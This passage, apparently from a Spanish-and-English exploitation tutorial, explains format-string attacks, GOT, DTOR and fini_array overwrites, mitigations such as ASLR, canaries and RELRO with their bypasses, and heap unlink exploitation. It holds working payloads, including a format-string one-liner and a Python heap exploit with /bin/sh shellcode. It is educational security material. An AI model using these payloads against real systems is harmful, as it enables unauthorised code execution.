%d\\n\"\n,\nlen\n);\nif\n(\nlen\n>=\n256\n){\nprintf\n(\n\"\\nLongitus excesiva\\n\"\n);\nexit\n(\n1\n);\n}\nif\n(\nstrlen\n(\nargv\n[\n2\n])\n<\nl\n)\nstrcpy\n(\nbuffer\n,\nargv\n[\n2\n]);\nelse\nprintf\n(\n\"\\nIntento de hack\\n\"\n);\nreturn\n0\n;\n}\nEn el ejemplo anterior vemos que el programa se espera 2 par√°metros. El primero la longitud de la siguiente cadena y el segundo la cadena.\nSi le pasamos como primer par√°metro un n√∫mero negativo saldr√° que len < 256 y pasaremos ese filtro, y adem√°s tambi√©n strlen(buffer) ser√° menor que l, pues l es unsigned int y ser√° muy grande.\nEste tipo de overflows no busca lograr escribir algo en el proceso del programa, sino superar filtros mal dise√±ados para explotar otras vulnerabilidades.\nVariables no inicializadas\nNo se sabe el valor que puede tomar una variable no inicializada y podr√≠a ser interesante observarlo. Puede ser que tome el valor que tomaba una variable de la funci√≥n anterior y esta sea controlada por el atacante.\nFormat Strings\nIn C\nprintf\nis function that can be used to\nprint\nsome string. The\nfirst parameter\nthis function expects is the\nraw text with the formatters\n. The\nfollowing parameters\nexpected are the\nvalues\nto\nsubstitute\nthe\nformatters\nfrom the raw text.\nThe vulnerability appears when an\nattacker text is put as the first argument\nto this function. The attacker will be able to craft a\nspecial input abusing\nthe\nprintf format\nstring capabilities to\nwrite any data in any address\n. Being able this way to\nexecute arbitrary code\n.\nFomatters:\n%08x ‚Äî\n>\n8\nhex bytes\n%d ‚Äî\n>\nEntire\n%u ‚Äî\n>\nUnsigned\n%s ‚Äî\n>\nString\n%n ‚Äî\n>\nNumber of written bytes\n%hn ‚Äî\n>\nOccupies\n2\nbytes instead of\n4\n<\nn\n>\n$X\n‚Äî\n>\nDirect access, Example:\n(\n\"%3\n$d\n\"\n, var1, var2, var3\n)\n‚Äî\n>\nAccess to var3\n%n\nwrites\nthe\nnumber of written bytes\nin the\nindicated address. Writing\nas much\nbytes\nas the hex number we\nneed\nto write is how you can\nwrite any data\n.\nAAAA%.6000d%4\n\\\n$n\n‚Äî\n>\nWrite\n6004\nin\nthe address indicated by the\n4\n¬∫ param\nAAAA.%500\n\\\n$08x\n‚Äî\n>\nParam at offset\n500\nGOT (Global Offsets Table) / PLT (**Procedure Linkage Table)\nThis is the table that contains the\naddress\nto the\nexternal functions\nused by the program.\nGet the address to this table with:\nobjdump -s -j .got ./exec\nObserve how after\nloading\nthe\nexecutable\nin GEF you can\nsee\nthe\nfunctions\nthat are in the\nGOT\n:\ngef‚û§ x/20x 0xDIR_GOT\nUsing GEF you can\nstart\na\ndebugging\nsession and execute\ngot\nto see the got table:\nIn a binary the GOT has the\naddresses to the functions or\nto the\nPLT\nsection that will load the function address. The goal of this exploit is to\noverride the GOT entry\nof a function that is going to be executed later\nwith\nthe\naddress\nof the PLT of the\nsystem\nfunction\n. Ideally, you will\noverride\nthe\nGOT\nof a\nfunction\nthat is\ngoing to be called with parameters controlled by you\n(so you will be able to control the parameters sent to the system function).\nIf\nsystem\nisn't used\nby the script, the system function\nwon't\nhave an entry in the GOT. In this scenario, you will\nneed to leak first the address\nof the\nsystem\nfunction.\nProcedure Linkage Table\nis a\nread only\ntable in ELF file that stores all necessary\nsymbols that need a resolution\n. When one of these functions are called the\nGOT\nwill\nredirect\nthe\nflow\nto the\nPLT\nso it can\nresolve\nthe\naddress\nof the function and write it on the GOT.\nThen, the\nnext time\na call is performed to that address the\nfunction\nis\ncalled directly\nwithout needing to resolve it.\nYou can see the PLT addresses with\nobjdump -j .plt -d ./vuln_binary\nExploit Flow\nAs explained before the goal is going to be to\noverwrite\nthe\naddress\nof a\nfunction\nin the\nGOT\ntable that is going to be called later. Ideally we could set the\naddress to a shellcode\nlocated in a executable section, but highly probable you won't be able to write a shellcode in a executable section.\nSo a different option is to\noverwrite\na\nfunction\nthat\nreceives\nits\narguments\nfrom the\nuser\nand\npoint\nit to the\nsystem\nfunction\n.\nTo write the address, usually 2 steps are done: You\nfirst writes 2Bytes\nof the address and then the other 2. To do so\n$hn\nis used.\nHOB\nis called to the 2 higher bytes of the address\nLOB\nis called to the 2 lower bytes of the address\nSo, because of how format string works you need to\nwrite first the smallest\nof [HOB, LOB] and then the other one.\nIf HOB < LOB\n[address+2][address]%.[HOB-8]x%[offset]\\$hn%.[LOB-HOB]x%[offset+1]\nIf HOB > LOB\n[address+2][address]%.[LOB-8]x%[offset+1]\\$hn%.[HOB-LOB]x%[offset]\nHOB LOB HOB_shellcode-8 N¬∫Param_dir_HOB LOB_shell-HOB_shell N¬∫Param_dir_LOB\n`python -c 'print \"\\x26\\x97\\x04\\x08\"+\"\\x24\\x97\\x04\\x08\"+ \"%.49143x\" + \"%4$hn\" + \"%.15408x\" + \"%5$hn\"'`\nFormat String Exploit Template\nYou an find a\ntemplate\nto exploit the GOT using format-strings here:\nFormat Strings Template\n.fini_array\nEssentially this is a structure with\nfunctions that will be called\nbefore the program finishes. This is interesting if you can call your\nshellcode just jumping to an address\n, or in cases where you need to go back to main again to\nexploit the format string a second time\n.\nobjdump\n-s\n-j\n.fini_array ./greeting\n‚Äã\n./greeting:\nfile\nformat\nelf32-i386\n‚Äã\nContents of section .fini_array:\n8049934\na0850408\n‚Äã\n#Put your address in 0x8049934\nNote that this\nwon't\ncreate\nan\neternal loop\nbecause when you get back to main the canary will notice, the end of the stack might be corrupted and the function won't be recalled again. So with this you will be able to\nhave 1 more execution\nof the vuln.\nFormat Strings to Dump Content\nA format string can also be abused to\ndump content\nfrom the memory of the program.\nFor example, in the following situation there is a\nlocal variable in the stack pointing to a flag.\nIf you\nfind\nwhere in\nmemory\nthe\npointer\nto the\nflag\nis, you can make\nprintf access\nthat\naddress\nand\nprint\nthe\nflag\n:\nSo, flag is in\n0xffffcf4c\nAnd from the leak you can see the\npointer to the flag\nis in the\n8th\nparameter:\nSo,\naccessing\nthe\n8th parameter\nyou can get the flag:\nNote that following the\nprevious exploit\nand realising that you can\nleak content\nyou can\nset pointers\nto\nprintf\nto the section where the\nexecutable\nis\nloaded\nand\ndump\nit\nentirely\n!\nDTOR\nNowadays is very\nweird to find a binary with a dtor section\n.\nThe destructor are functions that are\nexecuted before program finishes\n.\nIf you manage to\nwrite\nan\naddress\nto a\nshellcode\nin\n__DTOR_END__\n, that will be\nexecuted\nbefore the programs ends.\nGet the address of this section with:\nobjdump\n-s\n-j\n.dtors /exec\nrabin\n-s\n/exec\n|\ngrep\n‚Äú__DTOR‚Äù\nUsually you will find the\nDTOR\nsection\nbetween\nthe values\nffffffff\nand\n00000000\n. So if you just see those values, it means that there\nisn't any function registered\n. So\noverwrite\nthe\n00000000\nwith the\naddress\nto the\nshellcode\nto execute it.\nFormat Strings to Buffer Overflows\nTthe\nsprintf moves\na formatted string\nto\na\nvariable.\nTherefore, you could abuse the\nformatting\nof a string to cause a\nbuffer overflow in the variable\nwhere the content is copied to.\nFor example, the payload\n%.44xAAAA\nwill\nwrite 44B+\"AAAA\" in the variable\n, which may cause a buffer overflow.\n__atexit Structures\nNowadays is very\nweird to exploit this\n.\natexit()\nis a function to which\nother functions are passed as parameters.\nThese\nfunctions\nwill be\nexecuted\nwhen executing an\nexit()\nor the\nreturn\nof the\nmain\n.\nIf you can\nmodify\nthe\naddress\nof any of these\nfunctions\nto point to a shellcode for example, you will\ngain control\nof the\nprocess\n, but this is currently more complicated.\nCurrently the\naddresses to the functions\nto be executed are\nhidden\nbehind several structures and finally the address to which it points are not the addresses of the functions, but are\nencrypted with XOR\nand displacements with a\nrandom key\n. So currently this attack vector is\nnot very useful at least on x86\nand\nx64_86\n.\nThe\nencryption function\nis\nPTR_MANGLE\n.\nOther architectures\nsuch as m68k, mips32, mips64, aarch64, arm, hppa...\ndo not implement the encryption\nfunction because it\nreturns the same\nas it received as input. So these architectures would be attackable by this vector.\nsetjmp() & longjmp()\nNowadays is very\nweird to exploit this\n.\nSetjmp()\nallows to\nsave\nthe\ncontext\n(the registers)\nlongjmp()\nallows to\nrestore\nthe\ncontext\n.\nThe\nsaved registers\nare:\nEBX, ESI, EDI, ESP, EIP, EBP\nWhat happens is that EIP and ESP are passed by the\nPTR_MANGLE\nfunction, so the\narchitecture vulnerable to this attack are the same as above\n.\nThey are useful for error recovery or interrupts.\nHowever, from what I have read, the other registers are not protected,\nso if there is a\ncall ebx\n,\ncall esi\nor\ncall edi\ninside the function being called, control can be taken over. Or you could also modify EBP to modify the ESP.\nVTable y VPTR en C++\nEach class has a\nVtable\nwhich is an array of\npointers to methods\n.\nEach object of a\nclass\nhas a\nVPtr\nwhich is a\npointer\nto the arrayof its class. The VPtr is part of the header of each object, so if an\noverwrite\nof the\nVPtr\nis achieved it could be\nmodified\nto\npoint\nto a dummy method so that executing a function would go to the shellcode.\nMedidas preventivas y evasiones\nASLR no tan aleatorio\nPaX dive el espacio de direcciones del proceso en 3 grupos:\nCodigo y datos iniciados y no iniciados: .text, .data y .bss ‚Äî> 16bits de entropia en la variable delta_exec, esta variable se inicia aleatoriamente con cada proceso y se suma a las direcciones iniciales\nMemoria asignada por mmap() y libraries compartidas ‚Äî> 16bits, delta_mmap\nEl stack ‚Äî> 24bits, delta_stack ‚Äî> Realmente 11 (del byte 10¬∫ al 20¬∫ inclusive) ‚Äî>alineado a 16bytes ‚Äî> 524.288 posibles direcciones reales del stack\nLas variables de entorno y los argumentos se desplazan menos que un buffer en el stack.\nReturn-into-printf\nEs una t√©cnica para convertir un buffer overflow en un error de cadena de formato. Consiste en sustituir el EIP para que apunte a un printf de la funci√≥n y pasarle como argumento una cadena de formato manipulada para obtener valores sobre el estado del proceso.\nAtaque a librer√≠as\nLas librer√≠as est√°n en una posici√≥n con 16bits de aleatoriedad = 65636 posibles direcciones. Si un servidor vulnerable llama a fork() el espacio de direcciones de memoria es clocado en el proceso hijo y se mantiene intacto. Por lo que se puede intentar hacer un brute force a la funci√≥n usleep() de libc pas√°ndole como argumento ‚Äú16‚Äù de forma que cuando tarde m√°s de lo normal en responder se habr√° encontrado dicha funci√≥n. Sabiendo d√≥nde est√° dicha funci√≥n se puede obtener delta_mmap y calcular las dem√°s.\nLa √∫nica forma de estar seguros de que el ASLR funciona es usando arquitectura de 64bits. Ah√≠ no hay ataques de fuerza bruta.\nStackGuard y StackShield\nStackGuard\ninserta antes del EIP ‚Äî> 0x000aff0d(null, \\n, EndOfFile(EOF), \\r) ‚Äî> Siguen siendo vulnerables recv(), memcpy(), read(), bcoy() y no protege el EBP\nStackShield\nes m√°s elaborado que StackGuard\nGuarda en una tabla (Global Return Stack) todas las direcciones EIP de vuelta de forma que el overflow no cause ning√∫n da√±o. Ademas, se pueden comparar ambas direcciones para a ver si ha habido un desbordamiento.\nTambi√©n se puede comprobar la direcci√≥n de retorno con un valor l√≠mite, as√≠ si el EIP se va a un sitio distinto del habitual como el espacio de datos se sabr√°. Pero esto se sortea con Ret-to-lib, ROPs o ret2ret.\nComo se puede ver stackshield tampoco protege las variables locales.\nStack Smash Protector (ProPolice) -fstack-protector\nSe pone el canary antes del EBP. Reordena las variables locales para que los buffers est√©n en las posiciones m√°s altas y as√≠ no puedan sobreescribir otras variables.\nAdem√°s, realiza una copia segura de los argumentos pasados encima de la pila (encima de las vars locales) y usa estas copias como argumentos.\nNo puede proteger arrays de menos de 8 elementos ni buffers que formen parte de una estructura del usuario.\nEl canary es un n√∫mero random sacado de ‚Äú/dev/urandom‚Äù o sino es 0xff0a0000. Se almacena en TLS(Thread Local Storage). Los hilos comparten el mismo espacio de memoria, el TLS es un √°rea que tiene variables globales o est√°ticas de cada hilo. Sin embargo, en ppio estas son copiadas del proceso padre aunque el proceso hijo podr√≠a modificar estos datos sin modificar los del padre ni los de los dem√°s hijos. El problema es que si se usa fork() pero no se crea un nuevo canario, entonces todos los procesos (padre e hijos) usan el mismo canario. En i386 se almacena en gs:0x14 y en x86_64 se almacena en fs:0x28\nEsta protecci√≥n localiza funciones que tengan buffer que puedan ser atacados e incluye en ellas c√≥digo al ppio de la funci√≥n para colocar el canario y c√≥digo al final para comprobarlo.\nLa funci√≥n fork() realiza una copia exacta del proceso del padre, por eso mismo si un servidor web llama a fork() se puede hacer un ataque de fuerza bruta byte por byte hasta averiguar el canary que se est√° utilizando.\nSi se usa la funci√≥n execve() despu√©s de fork(), se sobreescribe el espacio y el ataque ya no es posible. vfork() permite ejecutar el proceso hijo sin crear un duplicado hasta que el proceso hijo intentase escribir, entonces s√≠ creaba el duplicado.\nRelocation Read-Only (RELRO)\nRelro\nRelro (Read only Relocation)\naffects the memory permissions similar to NX. The difference is whereas with NX it makes the stack executable, RELRO makes\ncertain things read only\nso we\ncan't write\nto them. The most common way I've seen this be an obstacle is preventing us from doing a\ngot\ntable overwrite\n, which will be covered later. The\ngot\ntable holds addresses for libc functions so that the binary knows what the addresses are and can call them. Let's see what the memory permissions look like for a\ngot\ntable entry for a binary with and without relro.\nWith relro:\ngef‚û§  vmmap\nStart              End                Offset             Perm Path\n0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc\n0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc\n0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc\n0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc\n0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc\n0x0000555555559000 0x000055555557a000 0x0000000000000000 rw-\n[\nheap\n]\n0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so\n0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so\n0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so\n0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so\n0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so\n0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-\n0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r--\n[\nvvar\n]\n0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x\n[\nvdso\n]\n0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so\n0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so\n0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-\n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw-\n[\nstack\n]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x\n[\nvsyscall\n]\ngef‚û§  p fgets\n$2\n=\n{\nchar *\n(\nchar *, int, FILE *\n)}\n0x7ffff7e4d100\n<\n_IO_fgets\n>\ngef‚û§  search-pattern 0x7ffff7e4d100\n[\n+\n]\nSearching\n'\\x00\\xd1\\xe4\\xf7\\xff\\x7f'\nin\nmemory\n[\n+\n]\nIn\n'/tmp/tryc'\n(\n0x555555557000-0x555555558000\n)\n,\npermission\n=\nr--\n0x555555557fd0 - 0x555555557fe8  ‚Üí\n\"\n\\x00\\xd1\\xe4\\xf7\\xff\\x7f\n[...]\"\nWithout relro:\ngef‚û§  vmmap\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try\n0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try\n0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try\n0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try\n0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try\n0x0000000000405000 0x0000000000426000 0x0000000000000000 rw-\n[\nheap\n]\n0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so\n0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so\n0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so\n0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so\n0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so\n0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-\n0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r--\n[\nvvar\n]\n0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x\n[\nvdso\n]\n0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so\n0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so\n0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-\n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw-\n[\nstack\n]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x\n[\nvsyscall\n]\ngef‚û§  p fgets\n$2\n=\n{\nchar *\n(\nchar *, int, FILE *\n)}\n0x7ffff7e4d100\n<\n_IO_fgets\n>\ngef‚û§  search-pattern 0x7ffff7e4d100\n[\n+\n]\nSearching\n'\\x00\\xd1\\xe4\\xf7\\xff\\x7f'\nin\nmemory\n[\n+\n]\nIn\n'/tmp/try'\n(\n0x404000-0x405000\n)\n,\npermission\n=\nrw-\n0x404018 - 0x404030  ‚Üí\n\"\n\\x00\\xd1\\xe4\\xf7\\xff\\x7f\n[...]\"\nFor the binary\nwithout relro\n, we can see that the\ngot\nentry address for\nfgets\nis\n0x404018\n. Looking at the memory mappings we see that it falls between\n0x404000\nand\n0x405000\n, which has the\npermissions\nrw\n, meaning we can read and write to it. For the binary\nwith relro\n, we see that the\ngot\ntable address for the run of the binary (pie is enabled so this address will change) is\n0x555555557fd0\n. In that binary's memory mapping it falls between\n0x0000555555557000\nand\n0x0000555555558000\n, which has the memory\npermission\nr\n, meaning that we can only read from it.\nSo what's the\nbypass\n? The typical bypass I use is to just don't write to memory regions that relro causes to be read only, and\nfind a different way to get code execution\n.\nNote that in order for this to happen the binary needs to know previous to execution the addresses to the functions:\nLazy binding: The address of a function is searched the first time the function is called. So, the GOT needs to have write permissions during execution.\nBind now: The addresses of the functions are solved at the begginig of the execution, then read-only permissions are given to sensitive sections like .got, .dtors, .ctors, .dynamic, .jcr.\n`**\n-z relro\n**\ny\n**\n-z now`**\nTo check if a program uses Bind now you can do:\nreadelf\n-l\n/proc/ID_PROC/exe\n|\ngrep\nBIND_NOW\nCuando el binario es cargado en memoria y una funci√≥n es llamada por primera vez se salta a la PLT (Procedure Linkage Table), de aqu√≠ se realiza un salto (jmp) a la GOT y descubre que esa entrada no ha sido resuelta (contiene una direcci√≥n siguiente de la PLT). Por lo que invoca al Runtime Linker o rtfd para que resuelva la direcci√≥n y la guarde en la GOT.\nCuando se llama a una funci√≥n se llama a la PLT, esta tiene la direcci√≥n de la GOT donde se almacena la direcci√≥n de la funci√≥n, por lo que redirige el flujo all√≠ y as√≠ se llama a la funci√≥n. Sin embargo, si es la primera vez que se llama a la funci√≥n, lo que hay en la GOT es la siguiente instrucci√≥n de la PLT, por lo tanto el flujo sigue el c√≥digo de la PLT (rtfd) y averigua la direcci√≥n de la funci√≥n, la guarda en la GOT y la llama.\nAl cargar un binario en memoria el compilador le ha dicho en qu√© offset tiene que situar datos que se deben de cargar cuando se corre el programa.\nLazy binding ‚Äî> La direcci√≥n de la funci√≥n se busca la primera vez que se invoca dicha funci√≥n, por lo que la GOT tiene permisos de escritura para que cuando se busque, se guarde ah√≠ y no haya que volver a buscarla.\nBind now ‚Äî> Las direcciones de las funciones se buscan al cargar el programa y se cambian los permisos de las secciones .got, .dtors, .ctors, .dynamic, .jcr a solo lectura.\n-z relro\ny\n-z now\nA pesar de esto, en general los programas no est√°n complicados con esas opciones luego estos ataques siguen siendo posibles.\nreadelf -l /proc/ID_PROC/exe | grep BIND_NOW\n‚Äî> Para saber si usan el BIND NOW\nFortify Source -D_FORTIFY_SOURCE=1 o =2\nTrata de identificar las funciones que copian de un sitio a otro de forma insegura y cambiar la funci√≥n por una funci√≥n segura.\nPor ej:\nchar buf[16];\nstrcpy(but, source);\nLa identifica como insegura y entonces cambia strcpy() por __strcpy_chk() utilizando el tama√±o del buffer como tama√±o m√°ximo a copiar.\nLa diferencia entre\n=1\no\n=2\nes que:\nLa segunda no permite que\n%n\nvenga de una secci√≥n con permisos de escritura. Adem√°s el par√°metro para acceso directo de argumentos solo puede ser usado si se usan los anteriores, es decir, solo se pueda usar\n%3$d\nsi antes se ha usado\n%2$d\ny\n%1$d\nPara mostrar el mensaje de error se usa el argv[0], por lo que si se pone en el la direcci√≥n de otro sitio (como una variable global) el mensaje de error mostrar√° el contenido de dicha variable. Pag 191\nReemplazo de Libsafe\nSe activa con: LD_PRELOAD=/lib/libsafe.so.2\no\n‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload\nSe interceptan las llamadas a algunas funciones inseguras por otras seguras. No est√° estandarizado. (solo para x86, no para compilaxiones con -fomit-frame-pointer, no compilaciones estaticas, no todas las funciones vulnerables se vuelven seguras y LD_PRELOAD no sirve en binarios con suid).\nASCII Armored Address Space\nConsiste en cargar las librer√≠a compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene a penas ning√∫n ataque, y menos en little endian.\nret2plt\nConsiste en realiza un ROP de forma que se llame a la funci√≥n strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la funci√≥n a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2¬∫byte de system()‚Ä¶ Al final se llama la direcci√≥n guardada en GOT que ser√° system()\nFalso EBP\nPara las funciones que usen el EBP como registro para apuntar a los argumentos al modificar el EIP y apuntar a system() se debe haber modificado el EBP tambi√©n para que apunte a una zona de memoria que tenga 2 bytes cuales quiera y despu√©s la direcci√≥n a &‚Äù/bin/sh‚Äù.\nJaulas con chroot()\ndebootstrap -arch=i386 hardy /home/user ‚Äî> Instala un sistema b√°sico bajo un subdirectorio espec√≠fico\nUn admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..\nInstrumentaci√≥n de c√≥digo\nValgrind ‚Äî> Busca errores\nMemcheck\nRAD (Return Address Defender)\nInsure++\n8 Heap Overflows: Exploits b√°sicos\nTrozo asignado\nprev_size |\nsize | ‚ÄîCabecera\n*mem | Datos\nTrozo libre\nprev_size |\nsize |\n*fd | Ptr forward chunk\n*bk | Ptr back chunk ‚ÄîCabecera\n*mem | Datos\nLos trozos libres est√°n en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan)\nEn ‚Äúsize‚Äù hay bits para indicar: Si el trozo anterior est√° en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.\nSi al liberar un trozo alguno de los contiguos se encuentra libre , estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo m√°s grande a frontlink() para que le inserte el bin adecuado.\nunlink(){\nBK = P->bk; ‚Äî> El BK del nuevo chunk es el que tuviese el que ya estaba libre antes\nFD = P->fd; ‚Äî> El FD del nuevo chunk es el que tuviese el que ya estaba libre antes\nFD->bk = BK; ‚Äî> El BK del siguiente chunk apunta al nuevo chunk\nBK->fd = FD; ‚Äî> El FD del anterior chunk apunta al nuevo chunk\n}\nPor lo tanto si conseguimos modificar el P->bk con la direcci√≥n de un shellcode y el P->fd con la direcci√≥n a una entrada en la GOT o DTORS menos 12 se logra:\nBK = P->bk = &shellcode\nFD = P->fd = &__dtor_end__ - 12\nFD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode\nY as√≠ se se ejecuta al salir del programa la shellcode.\nAdem√°s, la 4¬∫ sentencia de unlink() escribe algo y la shellcode tiene que estar reparada para esto:\nBK->fd = FD -> *(&shellcode + 8) = (&__dtor_end__ - 12) ‚Äî> Esto provoca la escritura de 4 bytes a partir del 8¬∫ byte de la shellcode, por lo que la primera instrucci√≥n de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.\nPor lo tanto el exploit se crea:\nEn el buffer1 metemos la shellcode comenzando por un jmp para que caiga en los nops o en el resto de la shellcode.\nDespu√©s de la shell code metemos relleno hasta llegar al campo prev_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev_size para que tenga el bit que dice que est√° libre) y ‚Äú-4‚Äú(0xfffffffc) en el size (para que cuando compruebe en el 3¬∫ trozo si el 2¬∫ estaba libre en realidad vaya al prev_size modificado que le dir√° que s¬¥est√° libre) -> As√≠ cuando free() investigue ir√° al size del 3¬∫ pero en realidad ir√° al 2¬∫ - 4 y pensar√° que el 2¬∫ trozo est√° libre. Y entonces llamar√° a\nunlink()\n.\nAl llamar a unlink() usar√° como P->fd los primeros datos del 2¬∫ trozo por lo que ah√≠ se meter√° la direcci√≥n que se quieres sobreescribir - 12(pues en FD->bk le sumar√° 12 a la direcci√≥n guardada en FD) . Y en esa direcci√≥n introducir√° la segunda direcci√≥n que encuentre en el 2¬∫ trozo, que nos interesar√° que sea la direcci√≥n a la shellcode(P->bk falso).\nfrom struct import *\nimport os\nshellcode = \"\\xeb\\x0caaaabbbbcccc\" #jm 12 + 12bytes de relleno\nshellcode += \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \\\n\"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \\\n\"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\";\nprev_size = pack(\"<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1\nfake_size = pack(\"<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre\naddr_sc = pack(\"<I\", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno\ngot_free = pack(\"<I\", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)\npayload = \"aaaabbbb\" + shellcode + \"b\"*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠\npayload += prev_size + fake_size + got_free + addr_sc #Se modifica el 2¬∫ trozo, el got_free apunta a donde vamos a guardar la direccion addr_sc + 12\nos.system(\"./8.3.o \" + payload)\nunset() liberando en sentido inverso (wargame)\nEstamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.\nEn ese caso:\nEn el chunck c se pone el shellcode\nEl chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV_INUSE desactivado de forma que piense que el chunck a est√° libre.\nAdem√°s, se sobreescribe en la cabecera b el size para que valga -4.\nEntonces, el programa se pensar√° que ‚Äúa‚Äù est√° libre y en un bin, por lo que llamar√° a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV_SIZE vale -4. Se pensar√° que el trozo de ‚Äúa‚Äù realmente empieza en b+4. Es decir, har√° un unlink() a un trozo que comienza en b+4, por lo que en b+12 estar√° el puntero ‚Äúfd‚Äù y en b+16 estar√° el puntero ‚Äúbk‚Äù.\nDe esta forma, si en bk ponemos la direcci√≥n a la shellcode y en fd ponemos la direcci√≥n a la funci√≥n ‚Äúputs()‚Äù-12 tenemos nuestro payload.\nT√©cnica de Frontlink\nSe llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().\nVulnerabilidad √∫til cuando el malloc que se ataca nunca es liberado (free()).\nNecesita:\nUn buffer que pueda desbordarse con la funci√≥n de entrada de datos\nUn buffer contiguo a este que debe ser liberado y al que se le modificar√° el campo fd de su cabecera gracias al desbordamiento del buffer anterior\nUn buffer a liberar con un tama√±o mayor a 512 pero menor que el buffer anterior\nUn buffer declarado antes del paso 3 que permita sobreescribir el prev_size de este\nDe esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.\nVulnerabilidad double free()\nSi se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma 